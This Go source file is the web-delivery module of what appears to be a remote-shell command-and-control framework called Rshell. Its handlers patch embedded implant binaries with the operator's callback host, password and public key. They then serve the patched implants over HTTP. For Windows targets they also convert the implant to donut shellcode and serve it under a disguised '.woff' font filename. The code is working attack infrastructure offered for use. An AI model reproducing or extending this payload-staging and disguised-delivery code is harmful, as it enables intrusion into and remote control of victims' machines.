package api

import (
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/godonut"
	"Rshell/pkg/logger"
	"Rshell/pkg/response"
	"bytes"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
	"strings"
	"sync"
)

var WebDeliveryServer = make(map[string]*http.Server)
var Mutex sync.Mutex

// @Summary List all web delivery configurations
// @Tags WebDelivery
// @Accept json
// @Produce json
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/webdelivery [get]
// @Security BearerAuth
func ListWebDelivery(c *gin.Context) {
	var webs []database.WebDelivery
	database.Engine.Find(&webs)
	response.OK(c, webs)
}
// @Summary Start a new web delivery server
// @Tags WebDelivery
// @Accept json
// @Produce json
// @Param body body object{listener=string,os=string,arch=string,port=string,filename=string,pass=string} true "Web delivery config"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/webdelivery [post]
// @Security BearerAuth
func StartWebDelivery(c *gin.Context) {
	var web struct {
		Listener string `json:"listener"`
		OS       string `json:"os"`
		Arch     string `json:"arch"`
		Port     string `json:"port"`
		Filename string `json:"filename"`
		Pass     string `json:"pass"`
	}
	if err := c.ShouldBindJSON(&web); err != nil {
		response.BadRequest(c, err.Error())
		return
	}
	var w database.WebDelivery
	if exist, _ := database.Engine.Where("listening_port = ?", web.Port).Exist(&w); exist {
		response.BadRequest(c, web.Port+"端口已被配置")
		return
	}

	inUse, err := isPortInUse(web.Port)
	if err != nil {
		logger.Error("检测端口 %s 时发生错误: %v\n", web.Port, err)
	}
	if inUse {
		response.BadRequest(c, web.Port+"端口被占用")
		return
	}

	osType := web.OS
	archType := web.Arch

	listenerTmp := strings.Split(web.Listener, "://")
	listenerType := listenerTmp[0]
	connectAddress := listenerTmp[1]

	// 查找符合条件的文件
	binaryFileName := findBinary(listenerType, osType, archType)
	if binaryFileName == "" {
		response.BadRequest(c, "未找到匹配的服务端文件")
		return
	}
	// 从嵌入的文件系统中读取对应文件内容
	binaryData, err := embeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
	if err != nil {
		response.BadRequest(c, "读取文件失败")
		return
	}
	var modifiedData []byte
	if listenerType == "oss" {
		// 替换文件中的特定字符串
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
		newStr := strings.ReplaceAll(connectAddress, " ", "")

		tmp, _ := encrypt.EncryptNormal([]byte(newStr))
		tmp2, _ := encrypt.EncodeBase64(tmp)
		newStr = string(tmp2)

		// 替换为的字符串
		newStr = padRight(newStr, len(oldStr))

		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))

	} else {
		// 替换文件中的特定字符串
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 要替换的字符串
		newStr := strings.ReplaceAll(connectAddress, " ", "")                // 替换为的字符串
		newStr = padRight(newStr, len(oldStr))

		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	}
	oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newPass := padRight(web.Pass, len(oldPass))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))

	oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	var key database.Key
	database.Engine.Where("1=1").Get(&key)
	newPublicKey := padRight(key.PublicKey, len(oldPublicKey))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))

	mux := http.NewServeMux()
	mux.HandleFunc("/"+web.Filename, func(w http.ResponseWriter, r *http.Request) {
		// 设置响应头，指定内容类型为二进制流
		w.Header().Set("Content-Type", "application/octet-stream")
		// 设置响应头，指定下载文件的名称
		w.Header().Set("Content-Disposition", "attachment; filename="+web.Filename)
		// 写入字节码到响应体
		w.Write(modifiedData)
	})

	if web.OS == "windows" {
		shellcode, err := godonut.GenShellcode(modifiedData, web.Pass, web.Arch)
		if err != nil {
			response.BadRequest(c, "shellcode生成失败")
			return
		}
		mux.HandleFunc("/"+web.Filename+".woff", func(w http.ResponseWriter, r *http.Request) {
			// 设置响应头，指定内容类型为二进制流
			w.Header().Set("Content-Type", "application/octet-stream")
			// 设置响应头，指定下载文件的名称
			w.Header().Set("Content-Disposition", "attachment; filename="+web.Filename+".woff")
			// 写入字节码到响应体
			w.Write(shellcode)
		})

	}
	tmp := strings.Split(connectAddress, ":")
	database.Engine.Insert(&database.WebDelivery{
		ListenerConfig: web.Listener,
		OS:             web.OS,
		Arch:           web.Arch,
		ListeningPort:  web.Port,
		Status:         1,
		FileName:       web.Filename,
		ServerAddress:  "http://" + tmp[0] + ":" + web.Port + "/" + web.Filename,
		Pass:           web.Pass,
	})

	server := &http.Server{
		Addr:    ":" + web.Port,
		Handler: mux,
	}

	// 存储服务器实例
	Mutex.Lock()
	WebDeliveryServer[web.Port] = server
	Mutex.Unlock()

	// 启动服务器（非阻塞）
	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Println(err)
		}
	}()

	response.OK(c, nil)
}
// UpdateWebDeliveryStatus 统一的 WebDelivery 状态处理
// @Summary Update web delivery server status (open/close)
// @Tags WebDelivery
// @Accept json
// @Produce json
// @Param port path string true "Port"
// @Param body body object{action=string} true "Action (open or close)"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/webdelivery/{port}/status [patch]
// @Security BearerAuth
func UpdateWebDeliveryStatus(c *gin.Context) {
	var body struct {
		Action string `json:"action"` // "open" or "close"
	}
	if err := c.ShouldBindJSON(&body); err != nil {
		response.BadRequest(c, err.Error())
		return
	}

	port := c.Param("port")
	if port == "" {
		response.BadRequest(c, "port is required")
		return
	}

	var wd database.WebDelivery
	database.Engine.Where("listening_port = ?", port).Get(&wd)

	if body.Action == "open" {
		inUse, err := isPortInUse(port)
		if err != nil {
			logger.Error("检测端口 %s 时发生错误: %v\n", port, err)
		}
		if inUse {
			response.BadRequest(c, port+"端口被占用")
			return
		}

		osType := wd.OS
		archType := wd.Arch

		listenerTmp := strings.Split(wd.ListenerConfig, "://")
		listenerType := listenerTmp[0]
		connectAddress := listenerTmp[1]

		binaryFileName := findBinary(listenerType, osType, archType)
		if binaryFileName == "" {
			response.BadRequest(c, "未找到匹配的服务端文件")
			return
		}
		binaryData, err := embeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
		if err != nil {
			response.BadRequest(c, "读取文件失败")
			return
		}

		var modifiedData []byte
		if listenerType == "oss" {
			oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			newStr := strings.ReplaceAll(connectAddress, " ", "")
			tmp, _ := encrypt.EncryptNormal([]byte(newStr))
			tmp2, _ := encrypt.EncodeBase64(tmp)
			newStr = string(tmp2)
			newStr = padRight(newStr, len(oldStr))
			modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
		} else {
			oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
			newStr := strings.ReplaceAll(connectAddress, " ", "")
			newStr = padRight(newStr, len(oldStr))
			modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
		}
		oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		newPass := padRight(wd.Pass, len(oldPass))
		modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))

		oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		var key database.Key
		database.Engine.Where("1=1").Get(&key)
		newPublicKey := padRight(key.PublicKey, len(oldPublicKey))
		modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))

		mux := http.NewServeMux()
		mux.HandleFunc("/"+wd.FileName, func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Content-Disposition", "attachment; filename="+wd.FileName)
			w.Write(modifiedData)
		})
		var wdd database.WebDelivery
		database.Engine.Where("listening_port = ?", port).Get(&wdd)
		if wdd.OS == "windows" {
			shellcode, err := godonut.GenShellcode(modifiedData, wdd.Pass, wdd.Arch)
			if err != nil {
				response.BadRequest(c, "shellcode生成失败")
			}
			mux.HandleFunc("/"+wdd.FileName+".woff", func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Type", "application/octet-stream")
				w.Header().Set("Content-Disposition", "attachment; filename="+wdd.FileName+".woff")
				w.Write(shellcode)
			})
		}

		database.Engine.Where("listening_port = ?", port).Update(&database.WebDelivery{Status: 1})
		server := &http.Server{
			Addr:    ":" + port,
			Handler: mux,
		}
		Mutex.Lock()
		WebDeliveryServer[port] = server
		Mutex.Unlock()
		go func() {
			if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				logger.Error(err.Error())
			}
		}()
		response.OK(c, nil)
	} else {
		err := WebDeliveryServer[port].Close()
		Mutex.Lock()
		delete(WebDeliveryServer, port)
		Mutex.Unlock()
		database.Engine.Where("listening_port = ?", port).Update(&database.WebDelivery{Status: 2})
		if err != nil {
			response.BadRequest(c, "Listener closed failed")
			return
		}
		response.OK(c, nil)
	}
}

// @Summary Delete a web delivery server
// @Tags WebDelivery
// @Accept json
// @Produce json
// @Param port path string true "Port"
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/webdelivery/{port} [delete]
// @Security BearerAuth
func DeleteWebDelivery(c *gin.Context) {
	port := c.Param("port")
	if port == "" {
		response.BadRequest(c, "port is required")
		return
	}
	var webdelivery database.WebDelivery
	database.Engine.Where("listening_port = ?", port).Get(&webdelivery)
	if webdelivery.Status == 1 {
		err := WebDeliveryServer[port].Close()
		Mutex.Lock()
		delete(WebDeliveryServer, port)
		Mutex.Unlock()
		database.Engine.Where("listening_port = ?", port).Delete(&database.WebDelivery{})
		if err != nil {
			response.BadRequest(c, "Listener closed failed")
			return
		}
	}
	database.Engine.Where("listening_port = ?", port).Delete(&database.WebDelivery{})
	response.OK(c, nil)
}
